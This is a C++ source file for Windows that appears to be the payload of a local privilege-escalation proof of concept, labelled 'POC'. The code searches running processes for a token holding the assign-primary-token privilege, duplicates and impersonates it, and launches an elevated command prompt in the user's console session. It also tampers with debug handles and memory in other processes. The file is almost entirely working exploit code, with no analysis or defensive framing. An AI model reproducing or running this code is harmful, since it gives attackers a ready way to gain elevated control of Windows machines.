#include "stdafx.h"

//#define _PRINT_CPP_NAMES_
#include "../ScEntry/address.h"

NTSTATUS GetToken(_In_ PVOID buf, _In_ const TOKEN_PRIVILEGES* RequiredSet, _Out_ HANDLE* phToken)
{
	NTSTATUS status;

	union {
		PVOID pv;
		PBYTE pb;
		PSYSTEM_PROCESS_INFORMATION pspi;
	};

	pv = buf;
	ULONG NextEntryOffset = 0;

	SECURITY_QUALITY_OF_SERVICE sqos = {
		sizeof(sqos), SecurityImpersonation, SECURITY_DYNAMIC_TRACKING, FALSE
	};

	OBJECT_ATTRIBUTES oa_sqos = { sizeof(oa_sqos), 0, 0, 0, 0, (SECURITY_QUALITY_OF_SERVICE*) & sqos};

	do
	{
		pb += NextEntryOffset;

		HANDLE hProcess, hToken, hNewToken;

		CLIENT_ID ClientId = { pspi->UniqueProcessId };

		if (ClientId.UniqueProcess)
		{
			if (0 <= NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &oa_sqos, &ClientId))
			{
				status = NtOpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken);

				NtClose(hProcess);

				if (0 <= status)
				{
					status = NtDuplicateToken(hToken, TOKEN_ADJUST_PRIVILEGES | TOKEN_IMPERSONATE | TOKEN_DUPLICATE,
						const_cast<POBJECT_ATTRIBUTES>(&oa_sqos), FALSE, TokenImpersonation, &hNewToken);

					NtClose(hToken);

					if (0 <= status)
					{
						status = NtAdjustPrivilegesToken(hNewToken, FALSE, const_cast<PTOKEN_PRIVILEGES>(RequiredSet), 0, 0, 0);

						if (STATUS_SUCCESS == status)
						{
							*phToken = hNewToken;
							return STATUS_SUCCESS;
						}
						NtClose(hNewToken);
					}
				}
			}
		}

	} while (NextEntryOffset = pspi->NextEntryOffset);

	return STATUS_UNSUCCESSFUL;
}

NTSTATUS GetToken(_In_ const TOKEN_PRIVILEGES* RequiredSet, _Out_ HANDLE* phToken)
{
	NTSTATUS status;

	ULONG cb = 0x40000;

	do
	{
		status = STATUS_INSUFFICIENT_RESOURCES;

		if (PBYTE buf = new BYTE[cb += PAGE_SIZE])
		{
			if (0 <= (status = NtQuerySystemInformation(SystemProcessInformation, buf, cb, &cb)))
			{
				if (STATUS_INFO_LENGTH_MISMATCH == (status = GetToken(buf, RequiredSet, phToken)))
				{
					status = STATUS_UNSUCCESSFUL;
				}
			}

			delete[] buf;
		}

	} while (status == STATUS_INFO_LENGTH_MISMATCH);

	return status;
}

NTSTATUS SetToken(HANDLE hToken)
{
	return NtSetInformationThread(NtCurrentThread(), ThreadImpersonationToken, &hToken, sizeof(hToken));
}

void StartCmd()
{
	LONG SessionId = WTSGetActiveConsoleSessionId();
	if (0 < SessionId)
	{
		WCHAR cmd[MAX_PATH];

		if (GetEnvironmentVariableW(_YW(L"ComSpec"), cmd, _countof(cmd)))
		{
			NTSTATUS status;

			HANDLE hToken, hNewToken;
			TOKEN_PRIVILEGES tp_Assign = { 1, { { { SE_ASSIGNPRIMARYTOKEN_PRIVILEGE }, SE_PRIVILEGE_ENABLED } } };
			if (0 <= GetToken(&tp_Assign, &hToken))
			{
				if (0 <= (status = SetToken(hToken)))
				{
					if (0 <= (status = NtDuplicateToken(hToken,
						TOKEN_ADJUST_SESSIONID | TOKEN_ADJUST_DEFAULT | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
						0, FALSE, TokenPrimary, &hNewToken)))
					{
						if (0 <= (status = NtSetInformationToken(hNewToken, TokenSessionId, &SessionId, sizeof(SessionId))))
						{
							STARTUPINFOW si = {
								sizeof(si), 0, const_cast<PWSTR>(_YW(L"Winsta0\\Default"))
							};
							PROCESS_INFORMATION pi;
							if (CreateProcessAsUserW(hNewToken, cmd,
								const_cast<PWSTR>(_YW(L"* /k whoami /priv /groups")), 0, 0, FALSE, 0, 0, 0, &si, &pi))
							{
								NtClose(pi.hThread);
								NtClose(pi.hProcess);
							}
						}
						NtClose(hNewToken);
					}

					SetToken(0);
				}

				NtClose(hToken);
			}
		}
	}
}

EXTERN_C
NTSYSAPI
NTSTATUS
NTAPI
NtGetNextThread(
	_In_ HANDLE ProcessHandle,
	_In_ HANDLE ThreadHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_ ULONG HandleAttributes,
	_In_ ULONG Flags,
	_Out_ PHANDLE NewThreadHandle
);

void CloseAllDbgObj(HANDLE ProcessHandle)
{
	HANDLE ThreadHandle = 0, hThread, h = 0;

	NTSTATUS status;
	do
	{
		if (0 <= (status = NtGetNextThread(ProcessHandle, ThreadHandle, THREAD_ALL_ACCESS, 0, 0, &(hThread = 0))))
		{
			THREAD_BASIC_INFORMATION tbi;

			if (0 <= (status = ZwQueryInformationThread(hThread, ThreadBasicInformation, &tbi, sizeof(tbi), 0)))
			{
				HANDLE hDbg;
				if (0 <= ZwReadVirtualMemory(ProcessHandle,
					&reinterpret_cast<_TEB*>(tbi.TebBaseAddress)->DbgSsReserved[1], &hDbg, sizeof(hDbg), 0) && hDbg)
				{
					if (0 <= ZwWriteVirtualMemory(ProcessHandle,
						&reinterpret_cast<_TEB*>(tbi.TebBaseAddress)->DbgSsReserved[1], &h, sizeof(h), 0))
					{
						NtDuplicateObject(ProcessHandle, hDbg, 0, 0, 0, 0, DUPLICATE_CLOSE_SOURCE);
					}
				}
			}
		}

		if (ThreadHandle)
		{
			NtClose(ThreadHandle);
		}

		ThreadHandle = hThread;

	} while (0 <= status);
}

void CloseAllDbgObj(ULONG_PTR HandleValue, ULONG_PTR UniqueProcessId)
{
	NTSTATUS status;
	ULONG cb = 0x10000;
	do
	{
		union {
			PVOID buf;
			PSYSTEM_HANDLE_INFORMATION_EX pshie;
		};

		if (buf = LocalAlloc(0, cb += 0x1000))
		{
			if (0 <= (status = NtQuerySystemInformation(SystemExtendedHandleInformation, buf, cb, &cb)))
			{
				if (ULONG_PTR NumberOfHandles = pshie->NumberOfHandles)
				{
					PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Entry = pshie->Handles;
					do
					{
						if (Entry->UniqueProcessId == UniqueProcessId && Entry->HandleValue == HandleValue)
						{
							PVOID Object = Entry->Object;

							Entry = pshie->Handles;
							NumberOfHandles = pshie->NumberOfHandles;

							do
							{
								if (Object == Entry->Object && Entry->UniqueProcessId != UniqueProcessId)
								{
									if (HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (ULONG)Entry->UniqueProcessId))
									{
										CloseAllDbgObj(hProcess);

										NtClose(hProcess);
									}

									break;
								}

							} while (Entry++, --NumberOfHandles);

							break;
						}
					} while (Entry++, --NumberOfHandles);
				}
			}

			LocalFree(buf);
		}
		else
		{
			break;
		}

	} while (status == STATUS_INFO_LENGTH_MISMATCH);
}

void NTAPI epApc(_In_ ULONG dwProcessId, _In_ PVOID Address, _In_ ULONG_PTR HandleValue)
{
	CPP_FUNCTION;

	BOOLEAN b;
	RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &b);

	CloseAllDbgObj(HandleValue, dwProcessId);

	StartCmd();

	if (HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId))
	{
		BOOL fOk = TRUE;
		ZwWriteVirtualMemory(hProcess, Address, &fOk, sizeof(fOk), 0);
		NtClose(hProcess);
	}

	MessageBoxW(0, _YW(L"OK"), _YW(L"POC"), MB_ICONINFORMATION);

	ExitProcess(0);
}